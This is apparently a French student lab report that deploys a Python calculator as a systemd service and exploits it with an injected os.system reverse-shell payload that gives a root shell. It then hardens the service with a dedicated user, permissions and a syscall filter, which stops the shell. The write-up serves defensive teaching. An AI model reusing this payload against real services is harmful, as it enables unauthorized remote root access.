# Part IV : My shitty app

## 1. Test

🌞 **Téléchargez l'app Python dans votre VM**

```console
[rocky@tp2 opt]$ ls calc.py 
calc.py
```

🌞 **Lancer l'application dans votre VM**

```console
$ sudo firewall-cmd --add-port=13337/tcp

$ python3 calc.py
```

```console
$ nc 10.1.1.129 13337$
Hello3+3 
6Hello
```

## 2. Création de service

🌞 **Créer un service `calculatrice.service`**

```console
$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 **Indiquer à systemd que vous avez modifié les services**

```console
$ sudo systemctl daemon-reload

$ sudo systemctl start calculatrice
```

🌞 **Vérifier que ce nouveau service est bien reconnu***

```console
$ sudo systemctl status calculatrice
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-13 14:42:27 CET; 1s ago
   Main PID: 3143 (python3)
      Tasks: 1 (limit: 10888)
     Memory: 3.3M
        CPU: 25ms
     CGroup: /system.slice/calculatrice.service
             └─3143 /usr/bin/python3 /opt/calc.py

Mar 13 14:42:27 tp2 systemd[1]: Started Super serveur calculatrice.
```

🌞 **Vous devez pouvoir utiliser l'application normalement :**

```console
$ journalctl -xe -u calculatrice
Mar 13 14:43:42 tp2 systemd[1]: Started Super serveur calculatrice.
░░ Subject: A start job for unit calculatrice.service has finished successfully
░░ Defined-By: systemd
░░ Support: https://wiki.rockylinux.org/rocky/support
░░ 
░░ A start job for unit calculatrice.service has finished successfully.
░░ 
░░ The job identifier is 5432.
```

## 3. Hack

🌞 **Hack l'application**

```console
$ nc 10.1.1.129 13337
Hello__import__("os").system("sh -i >& /dev/tcp/172.16.184.1/4545 0>&1")
0Hello
```

```console
$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [172.16.184.1] from (UNKNOWN) [172.16.184.129] 52430
sh: cannot set terminal process group (3221): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# whoami
whoami
root
sh-5.1# ls /opt/calc.py
ls /opt/calc.py
/opt/calc.py
sh-5.1# exit
exit
exit
```

## 4. Harden

### A. Utilisateurs

🌞 **Prouvez que le service s'exécute actuellement en `root`**

```console
$ ps -ef | grep calc
root        3238       1  0 14:50 ?        00:00:00 /usr/bin/python3 /opt/calc.py
rocky       3251    1368  0 14:53 pts/0    00:00:00 grep --color=auto calc
```

🌞 **Créer l'utilisateur `calculatrice`**

```console
$ sudo useradd -M -s /sbin/nologin brah
```

🌞 **Adaptez les permissions**

```console
$ sudo chown brah:brah /opt/calc.py

$ sudo chmod -wx /opt/calc.py

$ sudo chmod +r /opt/calc.py

$ sudo chmod u+x /opt/calc.py

$ ls -la /opt/calc.py 
---x------. 1 brah brah 660 Mar 13 14:36 /opt/calc.py
```

🌞 **Modifier le `.service`**

```console
$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
User=brah
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always

$ sudo systemctl daemon-reload

$ sudo systemctl restart calculatrice

$ sudo systemctl status calculatrice
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-13 15:18:41 CET; 14ms ago
   Main PID: 3523 (python3)
      Tasks: 1 (limit: 10888)
     Memory: 1.7M
        CPU: 8ms
     CGroup: /system.slice/calculatrice.service
             └─3523 /usr/bin/python3 /opt/calc.py

Mar 13 15:18:41 tp2 systemd[1]: Started Super serveur calculatrice.
```

🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**

```console
$ ps -ef | grep calc
brah        3933       1  0 15:30 ?        00:00:00 /usr/bin/python3 /opt/calc.py
rocky       3935    1368  0 15:32 pts/0    00:00:00 grep --color=auto calc
```

### B. Syscalls

🌞 **Tracez l'exécution de l'application : normal**

```console
$ sudo sysdig proc.name=calc.py -w calc.scap
```

[calc.scap](./calc.scap)

Syscalls utilisés : setresuid connect setreuid keyctl chdir prctl capget execve brk arch_prctl access openat fstat mmap close read set_tid_address set_robust_list rseq mprotect munmap getrandom futex readlink newfstatat sysinfo lseek getdents64 fcntl ioctl rt_sigaction dup geteuid getuid getegid getgid epoll_create1 socket setsockopt bind listen accept4 getsockname sendto recvfrom write getpeername exit_group pread64.

🌞 **Tracez l'exécution de l'application : hack**

```console
$ sudo sysdig user.name=brah -w calc2.scap
```

[calc_2.scap](./calc2.scap)

Syscalls utilisés : setresuid connect setreuid keyctl chdir prctl capget execve brk arch_prctl access openat fstat mmap close read pread64 set_tid_address set_robust_list rseq mprotect prlimit munmap getrandom futex readlink newfstatat sysinfo lseek getdents64 fcntl ioctl rt_sigaction dup geteuid getuid getegid getgid epoll_create1 socket setsockopt bind listen accept4 getsockname sendto recvfrom rt_sigprocmask clone3 wait4 uname getcwd getpid getppid getpgrp clone dup2 setpgid write pselect6 exit_group procexit rt_sigreturn getpeername

Syscalls en plus :

```python3
>>> legi = """setresuid connect setreuid keyctl chdir prctl capget execve brk a\
rch_prctl access openat fstat mmap close read set_tid_address set_robust_list r\
seq mprotect munmap getrandom futex readlink newfstatat sysinfo lseek getdentsf\
4 fcntl ioctl rt_sigaction dup geteuid getuid getegid getgid epoll_create1 soc \
et setsockopt bind listen accept4 getsockname sendto recvfrom write getpeernamx\
 exit_group pread64"""
>>> hack = """setresuid connect setreuid keyctl chdir prctl capget execve brk arch_prctl access openat fstat mmap close read pread64 set_tid_address set_robust_list rseq mprotect prlimit munmap getrandom futex readlink newfstatat sysinfo lseek getdents64 fcntl ioctl rt_sigaction dup geteuid getuid getegid getgid epoll_create1 socket setsockopt bind listen accept4 getsockname sendto recvfrom rt_sigprocmask clone3 wait4 uname getcwd getpid getppid getpgrp clone dup2 setpgid write pselect6 exit_group procexit rt_sigreturn getpeername"""
>>> legi = legi.split(" ")
>>> hack = hack.split(" ")
>>> for i in hack:
...     if i not in legi:
...         print(i)
...         
prlimit
rt_sigprocmask
clone3
wait4
uname
getcwd
getpid
getppid
getpgrp
clone
dup2
setpgid
pselect6
procexit
rt_sigreturn
```

🌞 **Adaptez le `.service`**

```console
$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
User=brah
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
SystemCallFilter=setresuid connect setreuid keyctl chdir prctl capget execve brk arch_prctl access openat fstat mmap close read set_tid_address set_robust_list rseq mprotect munmap getrandom futex readlink newfstatat sysinfo lseek getdents64 fcntl ioctl rt_sigaction dup geteuid getuid getegid getgid epoll_create1 socket setsockopt bind listen accept4 getsockname sendto recvfrom write getpeername exit_group pread64

$ sudo systemctl daemon-reload && sudo systemctl restart calculatrice
```

```console
$ nc 10.1.1.129 13337
Hello__import__("os").system("sh -i >& /dev/tcp/172.16.184.1/4545 0>&1")
```

```console
$ nc -lnvp 4545
listening on [any] 4545 ...

```

Le reverse shell ne s'ouvre plus.
